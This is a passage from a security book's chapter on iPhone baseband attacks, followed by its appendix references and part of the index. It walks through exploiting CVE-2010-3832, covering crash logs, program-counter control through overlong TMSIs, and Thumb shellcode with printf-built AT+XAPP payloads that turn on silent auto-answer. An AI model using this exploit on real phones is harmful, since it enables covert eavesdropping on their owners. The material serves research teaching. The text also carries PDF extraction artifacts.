ROM:A0026816 0C 99 LDR R1, [SP,#0x30+arg_0]
ROM:A0026818 FF F7 6D FB BL sub_A0025EF6
ROM:A002681C A0 69 LDR R0, [R4,#0x18]
ROM:A002681E 26 00 MOVS R6, R4
This code is at the beginning of a function called recv_signal() — not the
offi cial name, but our choice — that is called from more than 40 tasks and is
used for inter-task communication; it receives signals from other tasks. In this
case, the link register (r14) was directly called from the main function of the
mme:1 task. Moreover, by looking at the pool allocations in the Application_
Initialize() routine, you can deduce that the partition allocated was from a
pool handing out chunks of 52 bytes.
Despite the crash log showing the program counter (r15) to be 0xA0026818, you
can deduce from the Data Fault Address Register (DFAR) and the dump of the
other registers that the instruction that caused the fault was the register load from
memory at 0xA0026810. Great! This means you can have control over the fi rst argu-
ment that is passed to the function sub_A0025EF6(ptr). Disassembling this func-
tion shows that this is a mere wrapper around NU_Deallocate_Partition(ptr)
cc1111..iinndddd 335599 44//1166//22001122 55::4488::2211 PPMM
360 Chapter 11 n Baseband Attacks
that fi rst checks whether ptr == NULL. In case of a NULL pointer it logs an error,
otherwise it simply calls NU_Deallocate_Partition(ptr). Looking closer at the
implementation of partition memory, you can see that going this route will not
be an easy one. In contrast to the dynamic memory implementation, partition
memory does not give you an easy write4 primitive because there is no need for
coalesced blocks. Other ways exist to exploit control over some of the registers
in this scenario, but they are all long-winded and painful.
A simpler way to achieve your goal is to demand control over the program
counter! It turns out there is an easy way to achieve that. By increasing the length
of the TMSIs by four, and hence the number of overwritten words by one in
each try, you quickly arrive at the case of 19 overwritten words:
+XLOG: Exception Number: 1
Trap Class: 0xBBBB (HW PREFETCH ABORT TRAP)
System Stack:
0xA006FCA4
0x00000677
0x00000000
0x0000000A
0x00000000
0x00000000
0xB000E720
0xB000E788
Date: 17.07.2010
Time: 21:31
Register:
r0: 0x00000000 r1: 0x60000013 r2: 0xFFFF231C
r3: 0x00000000 r4: 0x6666665C r5: 0x66666660
r6: 0x66666664 r7: 0xB0016978 r8: 0x00000000
r9: 0xA00028E4 r10: 0xB008E730 r11: 0xB008FE9C
r12: 0x45564E54 r13: 0xB008FABC r14: 0xFFFF1360
r15: 0x6666666C
SPSR: 0x60000013 DFAR: 0x00000024 DFSR: 0x00000005
Lo and behold, you have gained control over the program counter! Looking
around the area referenced by the link register, you see that the function you
were supposed to be returning from had no arguments and was called using
a BL instruction. To test whether things are working, you try to return to a
location that simply does a BX LR. Woohoo, this works as well! No crash log is
produced and no signal is lost when you send a message with 0xFFFF058C as
the 19th word of the TMSI.
Finally, you take a look at how to turn on auto-answer now. The 3GPP speci-
fi cation 27.007 together with the ITU specifi cation T.250 make implementation of
automatic answering of calls after a specifi ed number of rings mandatory. The
number of rings is specifi ed in an S register, namely S0 and can be set using the
AT command ATS0=n with n being the number of rings; its value can be queried
using ATS0?. The contents of the S registers can be stored in NVRAM using AT&W,
cc1111..iinndddd 336600 44//1166//22001122 55::4488::2211 PPMM
Chapter 11 n Baseband Attacks 361
as a so-called ATC profi le. After you have identifi ed a function manipulating
this ATC profi le using error strings, you can hunt down the functions reading
to and writing from NVRAM and fi gure out the in-memory format of the ATC
profi le. You then see that the following function get_at_sreg_value is called
to query register Sn with k set to zero.
/* 0xA01B9F1B */
uint32_t __fastcall get_at_sreg_base_ptr(uint32_t a1, uint32_t a2)
{
uint32_t *t1;
uint32_t *t2;
uint32_t result;
t1 = &dword_B01B204C[15 * a1];
t2 = &dword_B01B23D0[17 * a2];
if ( t1[12] )
result = t2[14] + t1[13];
else
result = 0;
return result;
}
/* 0xA01C5AB7 */uint32_t __fastcall get_at_sreg_value(uint32_t k, uint32_t n)
{
return *(get_at_sreg_base_ptr(9, k) + n + 8);
}
The plan takes shape: Using the knowledge gained from the previous func-
tions allows you to set the S0 register remotely using a very short program. As
a fi rst step, you can write a little assembly program to set the S0 ring counter
using the at+xapp overfl ow. An example looks this:
00000000 :
0: 2107 movs r1, #7 /* can’t load #9 directly (whitespace) */
2: 1c88 adds r0, r1, #2 /* r0 = 9 */
4: 1a49 subs r1, r1, r1 /* r1 = 0 */
6: 47a8 blx r5 /* call 0xA01B9F1B */
8: 2401 movs r4, #1
a: 7204 strb r4, [r0, #8] /* set S0 = 1 */
c: 1b20 subs r0, r4, r4 /* r0 = 0, indicates ERROR */
e: b00a add sp, #0x28 /* adjust stack pointer */
10: bd70 pop {r4, r5, r6, pc} /* clean continuation */
12: 46c0 nop /* nop needed to align to word boundary */
A primitive way to test the above code then is the following:
# printf ‘AT+XAPP=”####################################’ > xapp-bin
# printf ‘4444\x1b\x9f\x1b\xA066667777\xF5\x2C\x0B\xB0’ >> xapp-bin
# printf ‘\x07\x21\x88\x1c\x49\x1a\xa8\x47\x01\x24\x04’ >> xapp-bin
# printf ‘\x72\x20\x1b\x0a\xb0\x70\xbd\xc0\x46”’ >> xapp-bin
# ./sendmodem “`cat xapp-bin`”
Sending command to modem: AT
cc1111..iinndddd 336611 44//1166//22001122 55::4488::2211 PPMM
362 Chapter 11 n Baseband Attacks
---.+
AT
OK
Sending command to modem: AT+XAPP=”####################################444466667
777?,
?!?I?G$r
p??F”
-..+
AT+XAPP=”####################################444466667777?,
?!?I?G$r
p??F”
ERROR
# ./sendmodem ‘ATS0?’
Sending command to modem: AT
-.+
AT
OK
Sending command to modem: ATS0?
-...+
ATS0?
001
OK
#
As you see, the at+xapp payload manages to set the S0 register to one. If you
call the iPhone now, it will automatically answer the call after the fi rst ring.
Let us now come to the last step and build the payload for switching on this
feature remotely.
Modifying the above payload slightly to crash instead of writing the value,
you can fi nd out that the S0 register lives at address 0xB002D768 in memory. As
an example, you could now use the following gadget to turn on auto-answer
remotely:
0xA01EC43C 1C 61 C4 E5 STRB R6, [R4,#0x11C]
0xA01EC440 F0 81 BD E8 LDMFD SP!, {R4-R8,PC}
Note that you need to have continuation of execution after writing the value
1 to the above-mentioned address. Altogether this gives us a single message less
than 100 bytes that succinctly demonstrating the exploitability of CVE-2010-3832.
Summary
We have given a thorough introduction to baseband attacks against iOS devices.
From instilling you with background knowledge on cellular networks, we moved
to showing you the inner workings of real-time operating systems running on
cc1111..iinndddd 336622 44//1166//22001122 55::4488::2211 PPMM
Chapter 11 n Baseband Attacks 363
the baseband chips of the various generations of iOS devices and the intricacies
of their heap memory managers.
These rather theoretical aspects were then counterbalanced with a quick-start
guide for getting a quick and dirty OpenBTS setup up-and-running. This setup
allows you to run your own GSM test network for researching over-the-air
baseband attacks in the lab.
We then dissected the actual cellular stacks and discussed their attack surface.
We showed you techniques to use to fi nd bugs yourself. Finally, we provided
examples of two public vulnerabilities (one local, one remote) and explained
the workings of the ultrasn0w unlock.
cc1111..iinndddd 336633 44//1166//22001122 55::4488::2211 PPMM
cc1111..iinndddd 336644 44//1166//22001122 55::4488::2211 PPMM
APPENDIX
Resources
The following resources were indispensible in writing this book.
n www.mediapost.com/publications/article/116920/
n www.f-secure.com/weblog/archives/00001814.html
n www.jailbreakme.com
n www.jailbreakme.com/star
n http://dvlabs.tippingpoint.com/blog/2010/02/15/pwn2own-2010
n http://seriot.ch/resources/talks_papers/iPhonePrivacy.pdf
n http://theiphonewiki.com/wiki/index.php?title=LibTiff
n Enterprise iOS, www.enterpriseios.com
n Managing iOS Devices with OS X Lion Server by Arek Dreyer (Peachpit
Press 2011)
n “Local and Push Notifi cation Programming Guide,” iOS Dev Center,
http://developer.apple.com/library/ios/#documentation/
NetworkingInternet/Conceptual/RemoteNotificationsPG/
n “iOS Configuration Profile Reference,” iOS Dev Center, http://
developer.apple.com/library/ios/#featuredarticles/
iPhoneConfigurationProfileRef/
n “Deploying iPhone and iPad Mobile Device Management,” http://images
.apple.com/iphone/business/docs/iOS_MDM.pdf
365
bbaapppp0011..iinndddd 336655 44//1166//22001122 55::4400::1133 PPMM
366 Appendix
n David Schuetz, “Inside Apple’s MDM Black Box,” BlackHat USA 2011
n https://media.blackhat.com/bh-us-11/Schuetz/BH_US_11_Schuetz_
InsideAppleMDM_Slides.pdf
n David Schuetz, “The iOS MDM Protocol,” BlackHat USA 2011
n https://media.blackhat.com/bh-us-11/Schuetz/
BH_US_11_Schuetz_InsideAppleMDM_WP.pdf
n Jean-Baptiste Bédrune and Jean Sigwald, “iPhone data protection in depth,”
Hack in the Box Security Conference, Amsterdam 2011
n Jean-Baptiste Bédrune and Jean Sigwald, “iPhone data protection tools,”
http://code.google.com/p/iphone-dataprotection
n Andrey Belenko, “Overcoming iOS Data Protection to Re-Enable iPhone
Forensics,” BlackHat USA 2011
n Dino Dai Zovi, “Apple iOS Security Evaluation: Vulnerability Analysis
and Data Encryption,” BlackHat USA 2011
n “PBKDF2,” Wikipedia, http://en.wikipedia.org/wiki/PBKDF2
n www.freebsd.org/doc/en_US.ISO8859-1/books/arch-handbook/mac-
synopsis.html
n www.blackhat.com/presentations/bh-dc-10/Seriot_Nicolas/BlackHat-
DC-2010-Seriot-iPhone-Privacy-wp.pdf
n http://developer.apple.com/library/mac/#documentation/Security/
Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox
.html
n http://reverse.put.as/2011/09/14/apple-sandbox-guide-v1-0/
n https://github.com/kennytm/Miscellaneous/blob/master/dyld_
decache.cpp
n www.semantiscope.com/research/BHDC2011/BHDC2011-Paper.pdf
n Fuzzing: Brute Force Vulnerability Discovery, Sutton, Greene, and Amini
n Fuzzing for Software Security Testing and Quality Assurance, Takanen, DeMott,
Miller
n www.ietf.org/rfc/rfc2616.txt
n www.tuaw.com/2007/10/09/
apple-adds-new-mobile-protocol-handlers/
n http://labs.idefense.com/software/fuzzing.php
n www.developershome.com/sms/
n www.dreamfabric.com/sms/
n www.nobbi.com/pduspy.htm
bbaapppp0011..iinndddd 336666 44//1166//22001122 55::4400::1133 PPMM
Appendix 367
n www.blackhat.com/presentations/bh-usa-09/MILLER/
BHUSA09-Miller-FuzzingPhone-PAPER.pdf
n “Heap Feng Shui in JavaScript,” www.phreedom.org/research/
heap-feng-shui/
n “Attacking the WebKit Heap,” www.immunityinc.com/infiltrate/2011/
presentations/webkit_heap.pdf
n The Mac Hacker’s Handbook, Chapter 8
n “Analysis of the jailbreakme v3 font exploit,” http://esec-lab.sogeti
.com/post/Analysis-of-the-jailbreakme-v3-font-exploit
n “Engineering Heap Overfl ow Exploits with JavaScript,” www.usenix.org/
event/woot08/tech/full_papers/daniel/daniel.pdf
n “Analysis of the jailbreakme v3 font exploit,” http://esec-lab.sogeti
.com/post/Analysis-of-the-jailbreakme-v3-font-exploit
n “Return-oriented Programming for the ARM Architecture,” Tim Kornau
http://static.googleusercontent.com/external_
content/untrusted_dlcp/www.zynamics.com/en//
downloads/kornau-tim--diplomarbeit--rop.pdf
n “Getting around non-executable stack (and fi x),” Solar Designer http://
insecure.org/sploits/linux.libc.return.lpr.sploit.html
n “ROP and iPhone,” http://blog.zynamics.com/2010/04/16/
rop-and-iphone/
n “Practical return-oriented programming,” Dino Dai Zovi http://
trailofbits.files.wordpress.com/2010/04/practical-rop.pdf
n www.eetimes.com/design/embedded/4207336/
Bill-Lamie--Story-of-a-man-and-his-real-time-operating-systems
n www.ertos.nicta.com.au/software/kenge/iguana-project/latest/
iguana_talk.pdf
n www.ertos.nicta.com.au/software/kenge/iguana-project/latest/
iguana_dev_talk.pdf
n www.ertos.nicta.com.au/software/kenge/iguana-project/latest/
userman.pdf
n http://gnuradio.org/redmine/projects/gnuradio/wiki/OpenBTSClocks
n Edward C. Lamie: Real-time Embedded Multithreading: Using ThreadX and
ARM, CMP, ISBN 1578201349, 356 pages, 2005.
n Halvar Flake: “More Fun With Graphs,” Black Hat Federal 2003
www.blackhat.com/presentations/bh-federal-03/bh-fed-03-halvar.pdf
n Enrico Perla, Massimiliano Oldani: “A Guide to Kernel Exploitation:
Attacking the Core,” Syngress, ISBN: 1597494860, 442 pages, 2010.
bbaapppp0011..iinndddd 336677 44//1166//22001122 55::4400::1133 PPMM
bbaapppp0011..iinndddd 336688 44//1166//22001122 55::4400::1133 PPMM
Index
NUMBERS alphanumeric passcodes, 54–55
2x2 vulnerabilities, 172 AMFI (AppleMobileFileIntegrity)
3GPP 24.008, 346–347 binary trust cache, 319–320
code signing enforcement, 82
A cs_enforcement_disable, 314–315
ADCs (analog-digital converters), 331 exec and, 72–73
addr, 100 hooks, 71
Address Space Layout Randomization AMSS (Advanced Mobile Subscriber
(ASLR). see ASLR (Address Space Software), 335
Layout Randomization) analog-digital converters (ADCs), 331
ADS (ARM Development Suite), 342–343 anti-debugging software, 141
Advanced Mobile Subscriber Software antivirus (AV) software, 4
(AMSS), 335 APNS (Apple Push Notifi cation Service)
AES (Advanced Encryption Standard) MDM network communication, 27–28
encryption, 51 Profi le Manager and, 31–32
AFC2 (Apple File Connection2) service, app stashing, 307